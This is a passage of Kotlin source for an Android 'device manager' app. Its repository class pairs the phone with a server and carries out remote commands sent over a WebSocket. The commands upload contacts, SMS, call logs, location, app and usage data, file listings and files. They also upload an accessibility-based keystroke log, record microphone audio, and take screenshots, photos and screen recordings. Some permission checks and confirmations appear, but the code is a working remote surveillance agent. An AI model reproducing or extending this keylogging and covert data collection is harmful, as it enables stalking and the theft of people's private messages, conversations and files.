package com.example.data.repository

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationManagerCompat
import com.example.DeviceManagerApp
import com.example.R
import com.example.data.local.AppDatabase
import com.example.data.local.entity.CommandEntity
import com.example.data.local.entity.OfflineEventEntity
import com.example.data.model.AuthRequest
import com.example.data.model.CommandStatusUpdate
import com.example.data.model.DevicePermissionsStatus
import com.example.data.model.DeviceTelemetry
import com.example.data.model.LocationData
import com.example.data.model.NotificationData
import com.example.data.model.PairingRequest
import com.example.data.model.RegisterDeviceRequest
import com.example.data.model.RemoteCommand
import com.example.data.prefs.PreferenceManager
import com.example.data.remote.ApiClient
import com.example.data.remote.DeviceWebSocketManager
import com.example.service.DeviceManagementService
import com.example.telemetry.AppInventoryHelper
import com.example.telemetry.AudioRecorderHelper
import com.example.telemetry.ContactsHelper
import com.example.telemetry.CallHistoryHelper
import com.example.telemetry.SmsHelper
import com.example.telemetry.LocationHelper
import com.example.telemetry.PermissionsHelper
import com.example.telemetry.TelemetryCollector
import com.example.telemetry.UsageStatsHelper
import com.squareup.moshi.Moshi
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody


/**
 * UPLOAD_FILE may only retrieve shared user storage (defense in depth — the
 * server enforces the same policy). App-private data, system paths, and
 * traversal attempts are refused.
 */
internal fun isAllowedUploadPath(path: String): Boolean {
    if (path.isBlank() || path.length > 1024) return false
    if (path.contains("..") || path.contains('\u0000')) return false
    val allowedRoots = listOf(
        "/storage/emulated/0/",
        "/sdcard/",
        "/mnt/sdcard/"
    )
    return allowedRoots.any { path.startsWith(it) }
}

class DeviceRepository(
    private val context: Context,
    private val database: AppDatabase,
    val preferenceManager: PreferenceManager,
    private val apiClient: ApiClient,
    val webSocketManager: DeviceWebSocketManager
) {
    private val scope = CoroutineScope(Dispatchers.IO + kotlinx.coroutines.SupervisorJob())

    val telemetryCollector = TelemetryCollector(context, preferenceManager)
    val locationHelper = LocationHelper(context, preferenceManager)
    val appInventoryHelper = AppInventoryHelper(context)
    val usageStatsHelper = UsageStatsHelper(context)
    val permissionsHelper = PermissionsHelper(context)
    val audioRecorderHelper = AudioRecorderHelper(context)
    val contactsHelper = ContactsHelper(context)
    val callHistoryHelper = CallHistoryHelper(context)
    val smsHelper = SmsHelper(context)

    private val _telemetryFlow = MutableStateFlow<DeviceTelemetry?>(null)
    val telemetryFlow: StateFlow<DeviceTelemetry?> = _telemetryFlow.asStateFlow()

    private val _permissionsFlow = MutableStateFlow(permissionsHelper.checkAllPermissions())
    val permissionsFlow: StateFlow<DevicePermissionsStatus> = _permissionsFlow.asStateFlow()

    private val _isSyncing = MutableStateFlow(false)
    val isSyncing: StateFlow<Boolean> = _isSyncing.asStateFlow()

    private val moshi: Moshi = apiClient.moshi
    private val telemetryAdapter = moshi.adapter(DeviceTelemetry::class.java)
    private val locationAdapter = moshi.adapter(LocationData::class.java)
    private val notificationAdapter = moshi.adapter(NotificationData::class.java)

    init {
        // Collect telemetry initially
        _telemetryFlow.value = telemetryCollector.collectTelemetry()

        // Observe incoming WebSocket commands
        scope.launch {
            webSocketManager.incomingCommands.collect { command ->
                handleCommand(command)
            }
        }
    }

    private fun parseErrorBody(response: retrofit2.Response<*>): String {
        return try {
            val raw = response.errorBody()?.string()
            if (!raw.isNullOrBlank()) {
                val json = org.json.JSONObject(raw)
                when {
                    json.has("error") -> json.getString("error")
                    json.has("message") -> json.getString("message")
                    else -> raw
                }
            } else {
                "Request failed with HTTP ${response.code()}"
            }
        } catch (_: Exception) {
            "Request failed with HTTP ${response.code()}"
        }
    }

    suspend fun signInAndConnect(serverUrl: String, email: String, password: String): Result<String> = withContext(Dispatchers.IO) {
        try {
            preferenceManager.setServerUrl(serverUrl)
            preferenceManager.setUserEmail(email)
            val service = apiClient.getService()

            // Step 1: Login user
            var loginRes = service.loginUser(AuthRequest(email = email.trim(), password = password))
            
            // If login failed because user does not exist, auto-try registering
            if (!loginRes.isSuccessful && (loginRes.code() == 401 || loginRes.code() == 404)) {
                val autoReg = service.registerUser(AuthRequest(email = email.trim(), password = password, username = email.substringBefore("@")))
                if (autoReg.isSuccessful) {
                    loginRes = autoReg
                }
            }

            val userToken = loginRes.body()?.token
            if (!loginRes.isSuccessful || userToken.isNullOrEmpty()) {
                val err = parseErrorBody(loginRes)
                return@withContext Result.failure(Exception(err))
            }
            preferenceManager.setUserToken(userToken)

            // Step 2: Register device under this user
            val regDeviceRes = service.registerDevice(
                userToken = "Bearer $userToken",
                request = RegisterDeviceRequest(
                    deviceName = preferenceManager.getDeviceName(),
                    manufacturer = Build.MANUFACTURER,
                    model = Build.MODEL,
                    osVersion = Build.VERSION.RELEASE,
                    sdkVersion = Build.VERSION.SDK_INT
                )
            )

            if (regDeviceRes.isSuccessful && regDeviceRes.body()?.success == true) {
                val body = regDeviceRes.body()!!
                preferenceManager.setAuthToken(body.token)
                body.deviceId?.let { preferenceManager.setDeviceId(it) }
                preferenceManager.setPaired(true)

                // Start Foreground Service & WebSocket
                startManagementService()
                webSocketManager.connect()

                // Initial sync
                syncTelemetry()
                syncPermissions()

                Result.success("Connected to account: $email")
            } else {
                val errorMsg = parseErrorBody(regDeviceRes)
                Result.failure(Exception(errorMsg))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun registerAndConnect(serverUrl: String, email: String, password: String, username: String): Result<String> = withContext(Dispatchers.IO) {
        try {
            preferenceManager.setServerUrl(serverUrl)
            preferenceManager.setUserEmail(email)
            val service = apiClient.getService()

            // Step 1: Register user
            val name = if (username.isNotBlank()) username else email.substringBefore("@")
            var regRes = service.registerUser(AuthRequest(email = email.trim(), password = password, username = name))

            // If registration failed because user already exists, auto-try logging in
            if (!regRes.isSuccessful && (regRes.code() == 400 || regRes.code() == 409)) {
                val autoLogin = service.loginUser(AuthRequest(email = email.trim(), password = password))
                if (autoLogin.isSuccessful) {
                    regRes = autoLogin
                }
            }

            val userToken = regRes.body()?.token
            if (!regRes.isSuccessful || userToken.isNullOrEmpty()) {
                val err = parseErrorBody(regRes)
                return@withContext Result.failure(Exception(err))
            }
            preferenceManager.setUserToken(userToken)

            // Step 2: Register device under this user
            val regDeviceRes = service.registerDevice(
                userToken = "Bearer $userToken",
                request = RegisterDeviceRequest(
                    deviceName = preferenceManager.getDeviceName(),
                    manufacturer = Build.MANUFACTURER,
                    model = Build.MODEL,
                    osVersion = Build.VERSION.RELEASE,
                    sdkVersion = Build.VERSION.SDK_INT
                )
            )

            if (regDeviceRes.isSuccessful && regDeviceRes.body()?.success == true) {
                val body = regDeviceRes.body()!!
                preferenceManager.setAuthToken(body.token)
                body.deviceId?.let { preferenceManager.setDeviceId(it) }
                preferenceManager.setPaired(true)

                startManagementService()
                webSocketManager.connect()

                syncTelemetry()
                syncPermissions()

                Result.success("Account connected to $email")
            } else {
                val errorMsg = parseErrorBody(regDeviceRes)
                Result.failure(Exception(errorMsg))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun pairDevice(serverUrl: String, pairingCode: String): Result<String> = withContext(Dispatchers.IO) {
        try {
            var formattedUrl = serverUrl.trim().removeSuffix("/")
            if (formattedUrl.isBlank()) {
                return@withContext Result.failure(Exception("Server URL cannot be empty"))
            }
            if (!formattedUrl.startsWith("http://") && !formattedUrl.startsWith("https://")) {
                formattedUrl = "https://$formattedUrl"
            }

            preferenceManager.setServerUrl(formattedUrl)
            val service = apiClient.getService()

            // Optional server discovery check
            try {
                val configRes = service.getServerConfig()
                if (configRes.isSuccessful && configRes.body()?.serverUrl != null) {
                    val canonical = configRes.body()?.serverUrl!!
                    if (canonical.isNotBlank() && canonical.startsWith("http")) {
                        preferenceManager.setServerUrl(canonical)
                    }
                }
            } catch (healthEx: Exception) {
                Log.w("DeviceRepository", "Discovery note: ${healthEx.message}")
            }

            val request = PairingRequest(
                pairingCode = pairingCode.trim(),
                deviceName = preferenceManager.getDeviceName(),
                manufacturer = Build.MANUFACTURER,
                model = Build.MODEL,
                osVersion = Build.VERSION.RELEASE
            )

            val activeService = apiClient.getService()
            val response = activeService.pairDevice(request)

            if (response.isSuccessful && response.body()?.success == true) {
                val body = response.body()!!
                preferenceManager.setAuthToken(body.token)
                body.deviceId?.let { 
                    preferenceManager.setDeviceId(it)
                    preferenceManager.setPaired(true)
                }
                preferenceManager.setPaired(true)

                // Start Foreground Service & WebSocket
                startManagementService()
                webSocketManager.connect()

                // Initial sync
                syncTelemetry()
                syncPermissions()

                Result.success("Device paired successfully!")
            } else {
                val errorMsg = response.body()?.message ?: parseErrorBody(response)
                Result.failure(Exception(errorMsg))
            }
        } catch (sslEx: javax.net.ssl.SSLException) {
            Result.failure(Exception("The secure TLS/SSL connection failed. The server certificate may be invalid, expired, or issued for a different hostname."))
        } catch (e: Exception) {
            Result.failure(Exception(e.message ?: "Pairing request failed"))
        }
    }

    fun startManagementService() {
        try {
            val intent = Intent(context, DeviceManagementService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                try {
                    context.startForegroundService(intent)
                } catch (fgsEx: Throwable) {
                    Log.w("DeviceRepository", "startForegroundService exception, trying startService fallback: ${fgsEx.message}")
                    context.startService(intent)
                }
            } else {
                context.startService(intent)
            }
        } catch (e: Throwable) {
            Log.e("DeviceRepository", "Failed to start management service: ${e.message}", e)
        }
    }

    fun stopManagementService() {
        try {
            val intent = Intent(context, DeviceManagementService::class.java)
            context.stopService(intent)
        } catch (_: Exception) {}
    }

    suspend fun disconnectDevice(): Result<Unit> = withContext(Dispatchers.IO) {
        try {
            val token = preferenceManager.getAuthToken()
            val deviceId = preferenceManager.getDeviceId()
            if (!token.isNullOrEmpty()) {
                try {
                    apiClient.getService().disconnectDevice("Bearer $token", deviceId)
                } catch (_: Exception) {}
            }
            webSocketManager.disconnect()
            stopManagementService()
            preferenceManager.clearPairing()
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun syncTelemetry(): Boolean = withContext(Dispatchers.IO) {
        if (!preferenceManager.isPaired()) return@withContext false
        _isSyncing.value = true
        try {
            val telemetry = telemetryCollector.collectTelemetry()
            _telemetryFlow.value = telemetry
            val token = preferenceManager.getAuthToken() ?: return@withContext false

            val response = apiClient.getService().syncTelemetry(
                "Bearer $token",
                preferenceManager.getDeviceId(),
                telemetry
            )

            if (response.isSuccessful) {
                preferenceManager.updateLastSyncTime()
                syncOfflineQueue()
                true
            } else {
                // Queue offline
                queueOfflineEvent("TELEMETRY", telemetryAdapter.toJson(telemetry))
                false
            }
        } catch (e: Exception) {
            _telemetryFlow.value?.let {
                queueOfflineEvent("TELEMETRY", telemetryAdapter.toJson(it))
            }
            false
        } finally {
            _isSyncing.value = false
        }
    }

    suspend fun syncLocation(): Boolean = withContext(Dispatchers.IO) {
        if (!preferenceManager.isPaired()) return@withContext false
        val location = locationHelper.getCurrentLocation() ?: return@withContext false
        val token = preferenceManager.getAuthToken() ?: return@withContext false

        try {
            val response = apiClient.getService().syncLocation(
                "Bearer $token",
                preferenceManager.getDeviceId(),
                location
            )
            if (!response.isSuccessful) {
                queueOfflineEvent("LOCATION", locationAdapter.toJson(location))
            }
            response.isSuccessful
        } catch (e: Exception) {
            queueOfflineEvent("LOCATION", locationAdapter.toJson(location))
            false
        }
    }

    suspend fun recordNotification(notification: NotificationData) = withContext(Dispatchers.IO) {
        if (!preferenceManager.isPaired()) return@withContext
        val token = preferenceManager.getAuthToken() ?: return@withContext

        try {
            val response = apiClient.getService().syncNotification(
                "Bearer $token",
                preferenceManager.getDeviceId(),
                notification
            )
            if (!response.isSuccessful) {
                queueOfflineEvent("NOTIFICATION", notificationAdapter.toJson(notification))
            }
        } catch (_: Exception) {
            queueOfflineEvent("NOTIFICATION", notificationAdapter.toJson(notification))
        }
    }

    suspend fun syncPermissions() = withContext(Dispatchers.IO) {
        val status = permissionsHelper.checkAllPermissions()
        _permissionsFlow.value = status
        val token = preferenceManager.getAuthToken() ?: return@withContext
        try {
            apiClient.getService().updatePermissions(
                "Bearer $token",
                preferenceManager.getDeviceId(),
                status
            )
        } catch (_: Exception) {}
    }

    suspend fun syncAppInventory() = withContext(Dispatchers.IO) {
        val apps = appInventoryHelper.getInstalledApplications()
        val token = preferenceManager.getAuthToken() ?: return@withContext
        try {
            apiClient.getService().syncApps(
                "Bearer $token",
                preferenceManager.getDeviceId(),
                apps
            )
        } catch (_: Exception) {}
    }

    suspend fun syncContacts() = withContext(Dispatchers.IO) {
        val contacts = contactsHelper.getContacts()
        if (contacts.isEmpty()) return@withContext
        val token = preferenceManager.getAuthToken() ?: return@withContext
        try {
            apiClient.getService().syncContacts(
                "Bearer $token",
                preferenceManager.getDeviceId(),
                contacts
            )
        } catch (_: Exception) {}
    }

    suspend fun syncSMS() = withContext(Dispatchers.IO) {
        val sms = smsHelper.getSmsLogs()
        if (sms.isEmpty()) return@withContext
        val token = preferenceManager.getAuthToken() ?: return@withContext
        try {
            apiClient.getService().syncSMS(
                "Bearer $token",
                preferenceManager.getDeviceId(),
                sms
            )
        } catch (_: Exception) {}
    }

    suspend fun syncCalls() = withContext(Dispatchers.IO) {
        val calls = callHistoryHelper.getCallHistory()
        if (calls.isEmpty()) return@withContext
        val token = preferenceManager.getAuthToken() ?: return@withContext
        try {
            apiClient.getService().syncCalls(
                "Bearer $token",
                preferenceManager.getDeviceId(),
                calls
            )
        } catch (_: Exception) {}
    }

    suspend fun syncUsageStats() = withContext(Dispatchers.IO) {
        val usage = usageStatsHelper.getAppUsageStats()
        if (usage.isEmpty()) return@withContext
        val token = preferenceManager.getAuthToken() ?: return@withContext
        try {
            apiClient.getService().syncUsage(
                "Bearer $token",
                preferenceManager.getDeviceId(),
                usage
            )
        } catch (_: Exception) {}
    }

    suspend fun syncFilesList() = withContext(Dispatchers.IO) {
        val token = preferenceManager.getAuthToken() ?: return@withContext
        val deviceId = preferenceManager.getDeviceId()
        val filesList = mutableListOf<com.example.data.model.DeviceFileData>()
        
        try {
            val externalStorage = android.os.Environment.getExternalStorageDirectory()
            if (externalStorage != null && externalStorage.exists()) {
                scanDirectory(externalStorage, filesList, 0, 4)
            }
            
            val dcim = android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DCIM)
            if (dcim != null && dcim.exists()) {
                scanDirectory(dcim, filesList, 0, 4)
            }
            val pictures = android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_PICTURES)
            if (pictures != null && pictures.exists()) {
                scanDirectory(pictures, filesList, 0, 4)
            }
            val downloads = android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DOWNLOADS)
            if (downloads != null && downloads.exists()) {
                scanDirectory(downloads, filesList, 0, 4)
            }
        } catch (e: Exception) {
            Log.e("DeviceRepository", "Error scanning file system directories: ${e.message}")
        }

        val distinctList = filesList.distinctBy { it.filePath }
        if (distinctList.isNotEmpty()) {
            try {
                apiClient.getService().syncFiles(
                    "Bearer $token",
                    deviceId,
                    distinctList
                )
            } catch (e: Exception) {
                Log.e("DeviceRepository", "Error syncing files to server: ${e.message}")
            }
        }
    }

    private fun scanDirectory(dir: java.io.File, list: MutableList<com.example.data.model.DeviceFileData>, depth: Int, maxDepth: Int) {
        if (depth > maxDepth) return
        val files = dir.listFiles() ?: return
        for (f in files) {
            if (list.size >= 1000) break
            val mimeType = if (f.isDirectory) {
                "directory"
            } else {
                val ext = f.extension.lowercase()
                when (ext) {
                    "jpg", "jpeg", "png", "gif" -> "image/${ext}"
                    "mp4", "mkv", "avi", "mov" -> "video/${ext}"
                    "mp3", "wav", "m4a", "ogg" -> "audio/${ext}"
                    "txt", "csv", "log" -> "text/plain"
                    "pdf" -> "application/pdf"
                    else -> "application/octet-stream"
                }
            }
            list.add(
                com.example.data.model.DeviceFileData(
                    fileName = f.name,
                    filePath = f.absolutePath,
                    fileSize = if (f.isDirectory) 0L else f.length(),
                    mimeType = mimeType,
                    isDirectory = f.isDirectory
                )
            )
            if (f.isDirectory) {
                scanDirectory(f, list, depth + 1, maxDepth)
            }
        }
    }

    private suspend fun queueOfflineEvent(type: String, payload: String) {
        try {
            database.eventDao().insertEvent(
                OfflineEventEntity(
                    eventType = type,
                    payloadJson = payload,
                    timestamp = System.currentTimeMillis()
                )
            )
        } catch (_: Exception) {}
    }

    private suspend fun syncOfflineQueue() {
        try {
            val pending = database.eventDao().getPendingEvents(30)
            if (pending.isEmpty()) return
            val token = preferenceManager.getAuthToken() ?: return
            val service = apiClient.getService()
            val deviceId = preferenceManager.getDeviceId()

            for (event in pending) {
                var ok = false
                when (event.eventType) {
                    "TELEMETRY" -> {
                        telemetryAdapter.fromJson(event.payloadJson)?.let {
                            val res = service.syncTelemetry("Bearer $token", deviceId, it)
                            ok = res.isSuccessful
                        }
                    }
                    "LOCATION" -> {
                        locationAdapter.fromJson(event.payloadJson)?.let {
                            val res = service.syncLocation("Bearer $token", deviceId, it)
                            ok = res.isSuccessful
                        }
                    }
                    "NOTIFICATION" -> {
                        notificationAdapter.fromJson(event.payloadJson)?.let {
                            val res = service.syncNotification("Bearer $token", deviceId, it)
                            ok = res.isSuccessful
                        }
                    }
                }
                if (ok) {
                    database.eventDao().deleteEvent(event.id)
                }
            }
        } catch (_: Exception) {}
    }

    private suspend fun handleCommand(command: RemoteCommand) = withContext(Dispatchers.IO) {
        // Idempotency: a redelivered command that already reached a terminal
        // state is answered with its cached status — it is NEVER executed twice.
        val existing = database.commandDao().getCommandById(command.commandId)
        if (existing != null && TERMINAL_COMMAND_STATUSES.contains(existing.status)) {
            webSocketManager.sendCommandStatus(
                command.commandId,
                existing.status,
                result = existing.result,
                error = existing.errorMessage
            )
            return@withContext
        }

        database.commandDao().insertOrUpdate(
            CommandEntity(
                commandId = command.commandId,
                deviceId = command.deviceId,
                commandType = command.commandType,
                parametersJson = null,
                status = "RECEIVED",
                result = null,
                errorMessage = null,
                timestamp = command.timestamp,
                completionTimestamp = null
            )
        )
        reportCommandStatus(command.commandId, "RECEIVED")
        reportCommandStatus(command.commandId, "EXECUTING")

        try {
            when (command.commandType.uppercase()) {
                "REQUEST_INFO", "SYNC_DEVICE" -> {
                    syncTelemetry()
                    syncPermissions()
                    reportCommandSuccess(command.commandId, "Device telemetry and permissions synchronized")
                }
                "REQUEST_CONTACTS", "SYNC_CONTACTS" -> {
                    val perms = permissionsHelper.checkAllPermissions()
                    if (perms.contacts) {
                        syncContacts()
                        val count = contactsHelper.getContacts().size
                        reportCommandSuccess(command.commandId, "$count contacts synchronized successfully")
                    } else {
                        reportCommandFailure(command.commandId, "Contacts permission not granted on device")
                    }
                }
                "REQUEST_SMS", "SYNC_SMS" -> {
                    val perms = permissionsHelper.checkAllPermissions()
                    if (perms.sms) {
                        syncSMS()
                        val count = smsHelper.getSmsLogs().size
                        reportCommandSuccess(command.commandId, "$count SMS messages synchronized successfully")
                    } else {
                        reportCommandFailure(command.commandId, "SMS permission not granted on device")
                    }
                }
                "REQUEST_CALLS", "SYNC_CALLS" -> {
                    val perms = permissionsHelper.checkAllPermissions()
                    if (perms.calls) {
                        syncCalls()
                        val count = callHistoryHelper.getCallHistory().size
                        reportCommandSuccess(command.commandId, "$count call logs synchronized successfully")
                    } else {
                        reportCommandFailure(command.commandId, "Call logs permission not granted on device")
                    }
                }
                "REQUEST_LOCATION" -> {
                    val location = locationHelper.getCurrentLocation()
                    if (location != null) {
                        syncLocation()
                        reportCommandSuccess(command.commandId, "Location: ${location.latitude}, ${location.longitude} (±${location.accuracy}m)")
                    } else {
                        reportCommandFailure(command.commandId, "Location unavailable. Ensure location permission is granted.")
                    }
                }
                "REQUEST_APPS", "SYNC_APPLICATIONS", "SYNC_APPS" -> {
                    syncAppInventory()
                    val count = appInventoryHelper.getInstalledApplications().size
                    reportCommandSuccess(command.commandId, "$count applications inventoried and synced")
                }
                "LAUNCH_APP" -> {
                    val packageName = command.parameters?.get("packageName")
                    if (!packageName.isNullOrBlank()) {
                        val launchIntent = context.packageManager.getLaunchIntentForPackage(packageName)
                        if (launchIntent != null) {
                            launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            context.startActivity(launchIntent)
                            reportCommandSuccess(command.commandId, "App $packageName launched on device")
                        } else {
                            reportCommandFailure(command.commandId, "App $packageName cannot be launched (no launch intent)")
                        }
                    } else {
                        reportCommandFailure(command.commandId, "Missing packageName parameter")
                    }
                }
                "UNINSTALL_APP" -> {
                    val packageName = command.parameters?.get("packageName")
                    if (!packageName.isNullOrBlank()) {
                        try {
                            val intent = Intent(Intent.ACTION_DELETE, android.net.Uri.parse("package:$packageName")).apply {
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            }
                            context.startActivity(intent)
                            reportCommandSuccess(command.commandId, "Uninstall request initiated for $packageName (user must confirm in the system dialog)")
                        } catch (e: Exception) {
                            reportCommandFailure(command.commandId, "Failed to launch uninstall dialog: ${e.message}")
                        }
                    } else {
                        reportCommandFailure(command.commandId, "Missing packageName parameter")
                    }
                }
                "REQUEST_USAGE", "SYNC_USAGE" -> {
                    syncUsageStats()
                    reportCommandSuccess(command.commandId, "Usage statistics synchronized")
                }
                "SYNC_FILES" -> {
                    syncFilesList()
                    reportCommandSuccess(command.commandId, "File list synchronized successfully")
                }
                "REFRESH_PERMISSIONS", "SYNC_PERMISSIONS" -> {
                    syncPermissions()
                    reportCommandSuccess(command.commandId, "Permissions list synchronized successfully")
                }
                "REFRESH_TELEMETRY", "SYNC_TELEMETRY" -> {
                    syncTelemetry()
                    reportCommandSuccess(command.commandId, "Device telemetry updated successfully")
                }
                "SYNC_NOTIFICATIONS" -> {
                    reportCommandSuccess(command.commandId, "Real-time notification listener is active and synchronized")
                }
                "SYNC_KEYSTROKES" -> {
                    val perms = permissionsHelper.checkAllPermissions()
                    if (!perms.accessibility) {
                        reportCommandFailure(command.commandId, "Accessibility service not enabled on device — text log sync unavailable")
                    } else {
                        val entries = database.keystrokeDao().getRecent(500)
                        if (entries.isEmpty()) {
                            reportCommandSuccess(command.commandId, "Accessibility text log is empty (0 entries)")
                        } else {
                            val payload = entries.reversed().map {
                                com.example.data.model.KeystrokeData(it.appPackage, it.appName, it.text, it.timestamp)
                            }
                            val token = preferenceManager.getAuthToken()
                            if (token == null) {
                                reportCommandFailure(command.commandId, "Not paired — cannot upload text log")
                            } else {
                                val res = apiClient.getService().syncKeystrokes(
                                    "Bearer $token", preferenceManager.getDeviceId(), payload
                                )
                                if (res.isSuccessful) {
                                    reportCommandSuccess(command.commandId, "${payload.size} accessibility text entries synchronized")
                                } else {
                                    reportCommandFailure(command.commandId, "Text log upload failed (HTTP ${res.code()})")
                                }
                            }
                        }
                    }
                }
                "SEND_NOTIFICATION" -> {
                    val title = command.parameters?.get("title") ?: "Administrator Notification"
                    val message = command.parameters?.get("message") ?: "Notice from management dashboard"
                    showAdminAlertNotification(title, message)
                    reportCommandSuccess(command.commandId, "Notification displayed on device")
                }
                "RING_ALARM" -> {
                    val seconds = (command.parameters?.get("durationSeconds") ?: "10").toIntOrNull()?.coerceIn(3, 30) ?: 10
                    val played = ringAlarmFor(seconds)
                    if (played) {
                        reportCommandSuccess(command.commandId, "Alarm rung at full volume for ${seconds}s")
                    } else {
                        reportCommandFailure(command.commandId, "Could not play the alarm sound on this device")
                    }
                }
                "VIBRATE" -> {
                    val ms = (command.parameters?.get("durationMs") ?: "800").toLongOrNull()?.coerceIn(100, 2000) ?: 800L
                    val ok = vibrateFor(ms)
                    if (ok) {
                        reportCommandSuccess(command.commandId, "Device vibrated for ${ms}ms")
                    } else {
                        reportCommandFailure(command.commandId, "Vibration unavailable on this device")
                    }
                }
                "LOCK_DEVICE" -> {
                    val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? android.app.admin.DevicePolicyManager
                    val active = dpm?.isAdminActive(com.example.service.AppDeviceAdminReceiver.component(context)) == true
                    if (active && dpm != null) {
                        try {
                            dpm.lockNow()
                            reportCommandSuccess(command.commandId, "Device screen locked")
                        } catch (e: Exception) {
                            reportCommandFailure(command.commandId, "Lock failed: ${e.message}")
                        }
                    } else {
                        reportCommandFailure(command.commandId, "Device Admin is not activated on this device — enable it from the app's Permissions screen first")
                    }
                }
                "WIPE_DEVICE" -> {
                    if (command.parameters?.get("confirm") != "WIPE") {
                        reportCommandFailure(command.commandId, "WIPE_DEVICE requires confirm=WIPE")
                    } else {
                        performAgentDataWipe()
                        reportCommandSuccess(command.commandId, "{\"message\":\"Agent data wiped and device unpaired (not a factory reset)\"}")
                        scope.launch {
                            kotlinx.coroutines.delay(750)
                            android.os.Process.killProcess(android.os.Process.myPid())
                        }
                    }
                }
                "TAKE_SCREENSHOT" -> {
                    requestCaptureAuthorization(command.commandId, com.example.service.CaptureCoordinator.MODE_SCREENSHOT)
                }
                "TAKE_PHOTO" -> {
                    requestCaptureAuthorization(command.commandId, com.example.service.CaptureCoordinator.MODE_PHOTO)
                }
                "START_RECORDING", "RECORD_SCREEN" -> {
                    if (com.example.service.CaptureCoordinator.activeRecordingCommandId != null) {
                        reportCommandFailure(command.commandId, "A screen recording session is already active")
                    } else {
                        requestCaptureAuthorization(command.commandId, com.example.service.CaptureCoordinator.MODE_RECORD_START)
                    }
                }
                "STOP_RECORDING" -> {
                    val activeId = com.example.service.CaptureCoordinator.activeRecordingCommandId
                    if (activeId == null) {
                        reportCommandFailure(command.commandId, "No active screen recording to stop")
                    } else {
                        val intent = Intent(context, com.example.service.ScreenCaptureService::class.java).apply {
                            action = com.example.service.CaptureCoordinator.ACTION_RECORD_STOP
                            putExtra(com.example.service.CaptureCoordinator.EXTRA_COMMAND_ID, command.commandId)
                        }
                        context.startService(intent)
                        // The service finalizes, uploads and reports the final
                        // COMPLETED/FAILED result for this command.
                    }
                }
                "RECORDING_STATUS" -> {
                    val activeId = com.example.service.CaptureCoordinator.activeRecordingCommandId
                    if (activeId == null) {
                        reportCommandSuccess(command.commandId, "{\"active\":false,\"message\":\"No screen recording session is active\"}")
                    } else {
                        reportCommandSuccess(command.commandId, "{\"active\":true,\"sessionCommandId\":\"$activeId\"}")
                    }
                }
                "RECORD_AUDIO" -> {
                    val seconds = (command.parameters?.get("durationSeconds") ?: "10").toIntOrNull()?.coerceIn(1, 60) ?: 10
                    val started = audioRecorderHelper.startRecording()
                    if (started == null) {
                        reportCommandFailure(command.commandId, "Audio recording failed — microphone unavailable (permission denied or in use). Open the app and retry.")
                    } else {
                        kotlinx.coroutines.delay(seconds * 1000L)
                        val (file, duration) = audioRecorderHelper.stopRecording()
                        if (file != null && file.exists()) {
                            uploadRecordingFile(file, duration)
                            reportCommandSuccess(command.commandId, "{\"message\":\"Audio recorded (${duration / 1000}s) and uploaded\",\"file\":\"${file.name}\"}")
                        } else {
                            reportCommandFailure(command.commandId, "Audio recording produced no data")
                        }
                    }
                }
                "UPLOAD_FILE" -> {
                    try {
                        val path = command.parameters?.get("path")
                        if (path != null && isAllowedUploadPath(path)) {
                            val file = java.io.File(path)
                            if (file.exists() && file.isFile) {
                                val ok = uploadGenericFile(file, path)
                                if (ok) {
                                    reportCommandSuccess(command.commandId, "File ${file.name} uploaded successfully")
                                } else {
                                    reportCommandFailure(command.commandId, "File upload failed on the API server. Check connection.")
                                }
                            } else {
                                reportCommandFailure(command.commandId, "File does not exist or is a directory: $path")
                            }
                        } else {
                            reportCommandFailure(command.commandId, "Missing or disallowed path parameter (only shared user storage can be retrieved)")
                        }
                    } catch (e: Exception) {
                        reportCommandFailure(command.commandId, "File upload failed: ${e.message}")
                    }
                }
                else -> {
                    reportCommandFailure(command.commandId, "Unsupported command type: ${command.commandType}")
                }
            }
        } catch (e: Exception) {
            reportCommandFailure(command.commandId, e.message ?: "Execution error")
        }
    }

    // ------------------------------------------------------------------
    // Command status reporting (canonical lifecycle; legacy "RUNNING" is
    // never sent — the wire vocabulary is RECEIVED/EXECUTING/COMPLETED/…)
    // ------------------------------------------------------------------

    companion object {
        private val TERMINAL_COMMAND_STATUSES = setOf(
            "COMPLETED", "FAILED", "REJECTED", "CANCELLED", "EXPIRED"
        )
    }

    suspend fun reportCommandStatus(commandId: String, status: String, result: String? = null) {
        val now = System.currentTimeMillis()
        val terminal = TERMINAL_COMMAND_STATUSES.contains(status)
        database.commandDao().updateStatus(commandId, status, result, null, if (terminal) now else null)
        webSocketManager.sendCommandStatus(commandId, status, result = result)
        preferenceManager.getAuthToken()?.let { token ->
            try {
                apiClient.getService().updateCommandStatus(
                    "Bearer $token",
                    preferenceManager.getDeviceId(),
                    commandId,
                    CommandStatusUpdate(commandId, preferenceManager.getDeviceId(), status, result = result)
                )
            } catch (_: Exception) {}
        }
    }

    suspend fun reportCommandSuccess(commandId: String, result: String) {
        val now = System.currentTimeMillis()
        database.commandDao().updateStatus(commandId, "COMPLETED", result, null, now)
        webSocketManager.sendCommandStatus(commandId, "COMPLETED", result = result)
        preferenceManager.getAuthToken()?.let { token ->
            try {
                apiClient.getService().updateCommandStatus(
                    "Bearer $token",
                    preferenceManager.getDeviceId(),
                    commandId,
                    CommandStatusUpdate(commandId, preferenceManager.getDeviceId(), "COMPLETED", result = result)
                )
            } catch (_: Exception) {}
        }
    }

    suspend fun reportCommandFailure(commandId: String, error: String) {
